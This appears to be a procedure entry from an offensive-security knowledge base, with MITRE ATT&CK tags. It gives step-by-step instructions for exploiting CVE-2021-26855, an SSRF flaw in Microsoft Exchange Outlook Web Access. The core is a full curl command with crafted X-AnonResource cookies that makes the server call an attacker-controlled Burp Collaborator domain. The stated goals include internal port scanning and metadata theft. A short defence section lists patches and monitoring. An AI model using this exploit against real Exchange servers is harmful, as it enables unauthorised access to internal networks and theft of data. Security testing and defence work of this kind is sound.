---
id: proc-uuid-1234
tags:
  - ssrf
  - microsoft-exchange
  - cve-2021-26855
  - owa
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ssrf-exchange-owa]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.712Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-in-Exchange-OWA

## Summary

This procedure exploits CVE-2021-26855 in Microsoft Exchange Server's Outlook Web Access (OWA) to perform Server-Side Request Forgery (SSRF). By sending a crafted HTTP GET request to the /owa/auth/x.js endpoint with specific cookies, the server is tricked into making an outbound request to an attacker-controlled domain, confirming SSRF and enabling potential access to internal network resources or metadata.

## Description

The vulnerability stems from improper validation of HTTP requests and cookies in the OWA component, allowing arbitrary server-side requests. Discovered via the U.S. Department of Defense program, it was demonstrated using Burp Collaborator for out-of-band detection. The attack requires no authentication and targets public-facing Exchange servers. Expected outcomes include SSRF confirmation via callbacks and, if chained, access to services like AWS metadata endpoints or internal APIs. Prerequisites include network access to the target and control over a collaborator domain.

## Requirements

1. Access to a vulnerable Microsoft Exchange Server (version affected by CVE-2021-26855)
2. Burp Collaborator or similar OOB tool for callback detection
3. curl installed for request crafting
4. Knowledge of the target's OWA URL (e.g., https://target.com/owa)

## Defense

Defensive measures and detection strategies:

- Apply Microsoft patches for CVE-2021-26855 immediately
- Implement web application firewall (WAF) rules to block anomalous cookie patterns (e.g., X-AnonResource-Backend pointing to external domains)
- Monitor outbound traffic from Exchange servers for unexpected DNS/HTTP requests to unknown domains
- Enable logging for OWA requests and alert on SSRF indicators like unusual Host headers or cookie manipulations

## Objectives

1. Trigger SSRF to confirm vulnerability presence
2. Detect outbound requests for proof-of-concept
3. Enable further attacks like internal port scanning or metadata theft

## Instructions

### Step 1: Setup Out-of-Band Detection

**Context**: Configure Burp Collaborator to receive callbacks from the SSRF, confirming the server's outbound request.

Generate a unique collaborator payload (e.g., burpcollaborator.net/ecp/default.flt?~3) and note it for use in the cookie.

**Expected Output**: No direct output; monitor the Collaborator client for incoming interactions.

### Step 2: Craft and Send HTTP Request

**Context**: Use curl to send a GET request to the /owa/auth/x.js endpoint with manipulated cookies to force SSRF.

**Command** ([[commands/curl-ssrf-exchange-owa]]):
```bash
curl -i -s -k -X $'GET' -H $'Host: target-exchange.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' $'https://target-exchange.com/owa/auth/x.js'
```

> This command mimics a browser request with custom headers and cookies. The X-AnonResource-Backend cookie redirects the server to the collaborator domain. Expected output is the server's HTTP response (e.g., 200 OK with JavaScript content), but success is validated by Collaborator callbacks showing DNS resolution or HTTP GET from the target's IP.

### Step 3: Validate SSRF

**Context**: Check for evidence of the SSRF trigger in the collaborator tool.

Monitor Burp Collaborator for inbound requests. If callbacks appear, SSRF is confirmed.

**Expected Output**: Logs in Collaborator showing requests like GET /ecp/default.flt?~3 from the Exchange server's IP.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-exchange-owa]]

## Tools Used

- [[tools/curl]]
- [[tools/Burp-Collaborator]]

## Tags

- ssrf
- microsoft-exchange
- cve-2021-26855
- owa
